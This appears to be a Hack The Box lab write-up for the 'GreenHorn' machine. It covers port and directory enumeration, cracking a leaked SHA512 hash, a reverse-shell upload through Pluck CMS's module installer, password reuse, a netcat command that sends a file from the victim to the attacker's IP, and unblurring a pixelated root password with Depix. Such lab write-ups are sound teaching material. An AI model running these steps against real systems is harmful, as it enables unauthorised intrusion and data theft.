{% from "macros.html" import console, image, text, code, list, link, header, script, imageModal %}

{{imageModal()}}

{{header("Enumeration", "enumeration")}}

{{text("We start off by scanning all the ports.")}}

{{console("nmap -T5 -p- -sC -sV 10.10.11.25", "Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-12-20 18:23 CET
Warning: 10.10.11.25 giving up on port because retransmission cap hit (2).
Nmap scan report for 10.10.11.25
Host is up (0.066s latency).
Not shown: 65093 closed tcp ports (reset), 438 filtered tcp ports (no-response)
PORT     STATE SERVICE VERSION
22/tcp   open  ssh     OpenSSH 8.9p1 Ubuntu 3ubuntu0.10 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   256 57:d6:92:8a:72:44:84:17:29:eb:5c:c9:63:6a:fe:fd (ECDSA)
|_  256 40:ea:17:b1:b6:c5:3f:42:56:67:4a:3c:ee:75:23:2f (ED25519)
80/tcp   open  http    nginx 1.18.0 (Ubuntu)
|_http-server-header: nginx/1.18.0 (Ubuntu)
|_http-title: Did not follow redirect to http://greenhorn.htb/
3000/tcp open  ppp?")}}

{{text("We find 2 open ports:")}}

{{list(['22 (SSH)', '80 (HTTP)'])}}

{{text("When we try to go to the web site, it redirects us to <code class='bg-gray-300 rounded-md px-1 dark:bg-neutral-700'>http://greenhorn.htb</code>. We add that entry to our <code class='bg-gray-300 rounded-md px-1 dark:bg-neutral-700'>/etc/hosts</code> file and visit the page once more.")}}

{{image("../../static/writeups/greenhorn/images/000001.jpg")}}

{{text("I continued with directory enumerating, and was able to find a login page.")}}

{{console("ffuf -u http://greenhorn.htb/FUZZ -w /usr/share/wordlists/dirb/big.txt -e .php -fw 1", "
        /'___\  /'___\           /'___\       
       /\ \__/ /\ \__/  __  __  /\ \__/       
       \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\      
        \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/      
         \ \_\   \ \_\  \ \____/  \ \_\       
          \/_/    \/_/   \/___/    \/_/       

       v2.1.0-dev
...
________________________________________________

admin.php               [Status: 200, Size: 4528, Words: 288, Lines: 131, Duration: 62ms]
data                    [Status: 301, Size: 178, Words: 6, Lines: 8, Duration: 60ms]
docs                    [Status: 301, Size: 178, Words: 6, Lines: 8, Duration: 61ms]
files                   [Status: 301, Size: 178, Words: 6, Lines: 8, Duration: 53ms]
images                  [Status: 301, Size: 178, Words: 6, Lines: 8, Duration: 55ms]
install.php             [Status: 200, Size: 4537, Words: 284, Lines: 131, Duration: 65ms]
login.php               [Status: 200, Size: 1242, Words: 73, Lines: 32, Duration: 68ms]
requirements.php        [Status: 200, Size: 4549, Words: 286, Lines: 131, Duration: 73ms]
robots.txt              [Status: 200, Size: 47, Words: 4, Lines: 3, Duration: 57ms]
:: Progress: [40938/40938] :: Job [1/1] :: 615 req/sec :: Duration: [0:01:12] :: Errors: 12 ::")}}

{{text("Since I had no credentials, and couldn't find anything else on the site, I proceeded with checking the port <code class='bg-gray-300 rounded-md px-1 dark:bg-neutral-700'>3000</code>")}}

{{image("../../static/writeups/greenhorn/images/000002.jpg")}}

{{text("After finding the <code class='bg-gray-300 rounded-md px-1 dark:bg-neutral-700'>GreenHorn</code> repository, I started looking through the files.")}}

{{text("I was able to find a <code class='bg-gray-300 rounded-md px-1 dark:bg-neutral-700'>pass.php</code> file with what looked like a hash.")}}

{{image("../../static/writeups/greenhorn/images/000003.jpg")}}

{{text("I save it into a file and used <code class='bg-gray-300 rounded-md px-1 dark:bg-neutral-700'>john</code> to crack it.")}}

{{console("john hash.txt --wordlist=/usr/share/wordlists/rockyou.txt --format=Raw-SHA512", "Using default input encoding: UTF-8
Loaded 1 password hash (Raw-SHA512 [SHA512 256/256 AVX2 4x])
Warning: poor OpenMP scalability for this hash type, consider --fork=8
Will run 8 OpenMP threads
Press 'q' or Ctrl-C to abort, almost any other key for status
[REDACTED]        (?)     
1g 0:00:00:00 DONE (2024-12-20 18:58) 20.00g/s 163840p/s 163840c/s 163840C/s 123456..whitetiger
Use the '--show' option to display all of the cracked passwords reliably
Session completed. ")}}

{{text("Now with a password, I returned to the login page and tried logging in.")}}

{{image("../../static/writeups/greenhorn/images/000004.jpg")}}

{{text("Password was correct and now we had access to the admin panel.")}}

{{text("On the bottom of the site, we notice that the version is <code class='bg-gray-300 rounded-md px-1 dark:bg-neutral-700'>pluck 4.7.18</code>.")}}

{{text("Let's try to find a exploit related to this version.")}}

{{text("A simple search and I came across this.")}}

{{link("https://www.exploit-db.com/exploits/51592", "https://www.exploit-db.com/favicon.ico", "Pluck v4.7.18 - Remote Code Execution (RCE)")}}

{{text("For some reason, I couldn't get the exploit to successfully log in, so we will do it manually.")}}

{{text("We proceed to <code class='bg-gray-300 rounded-md px-1 dark:bg-neutral-700'>manage modules</code> and click on <code class='bg-gray-300 rounded-md px-1 dark:bg-neutral-700'>install a module</code>.")}}

{{text("Now we navigate to <code class='bg-gray-300 rounded-md px-1 dark:bg-neutral-700'>revshells.com</code> and get ourselves a <code class='bg-gray-300 rounded-md px-1 dark:bg-neutral-700'>pentest monkey</code> shell.")}}

{{text("Just like the exploit, we first have to zip it before uploading it.")}}

{{console("zip shell.zip shell.php")}}

{{text("Now we set up a listener and we can upload our archive.")}}

{{image("../../static/writeups/greenhorn/images/000005.jpg")}}

{{text("After successfully uploading it, we should instantly get a connection.")}}

{{image("../../static/writeups/greenhorn/images/000006.jpg")}}

{{header}}

{{text("I spend a lot of time looking through the file system, but I couldn't find anything.")}}

{{text("Then I remembered that one of the users, <code class='bg-gray-300 rounded-md px-1 dark:bg-neutral-700'>junior</code>, was mentioned before.")}}

{{text("Since he was a 'junior', I wondered if we reused his passwords.")}}

{{image("../../static/writeups/greenhorn/images/000007.jpg")}}

{{text("And I was right, he used the same password that allowed us to log in into the Pluck CMS.")}}

{{header}}

{{text("I noticed a <code class='bg-gray-300 rounded-md px-1 dark:bg-neutral-700'>.pdf</code> file in my user's home directory. I downloaded it onto my machine.")}}

{{text("My machine.")}}

{{console("nc -nlvp 1235 > 'Using OpenVAS.pdf'")}}

{{text("Victim's machine.")}}

{{console("nc 10.10.14.156 1235 < 'Using OpenVAS.pdf'")}}

{{text("Having downloaded the file, I opened it.")}}

{{image("../../static/writeups/greenhorn/images/000008.jpg")}}

{{text("It is a note about the installation of OpenVAS. There also is a password in the note, but it seems to be blurred out.")}}

{{text("I spend a lot of time stuck on this part, but finally I found the right tool for the job.")}}

{{link("https://github.com/spipm/Depix", "../../static/writeups/images/github.jpg", "Depix")}}

{{text("'Recovering plaintext from pixelized screenshots' sounded exactly like the thing we needed. I cloned the repository onto my machine.")}}

{{text("We needed to save it as an image, we can do so by simply right-clicking the pixelized text.")}}

{{image("../../static/writeups/greenhorn/images/000009.jpg")}}

{{text("After using the tool we downloaded, we should get the correct password.")}}

{{console("python3 depix.py -p ../image.png -s images/searchimages/debruinseq_notepad_Windows10_closeAndSpaced.png -o ./output.png", "2024-12-20 20:02:12,388 - Loading pixelated image from ../image.png
2024-12-20 20:02:12,398 - Loading search image from images/searchimages/debruinseq_notepad_Windows10_closeAndSpaced.png
...
2024-12-20 20:03:19,707 - Saving output image to: ./output.png")}}

{{text("We now open the <code class='bg-gray-300 rounded-md px-1 dark:bg-neutral-700'>output.png</code> file and use the password to log in as root.")}}

{{image("../../static/writeups/greenhorn/images/000010.jpg")}}

{{script()}}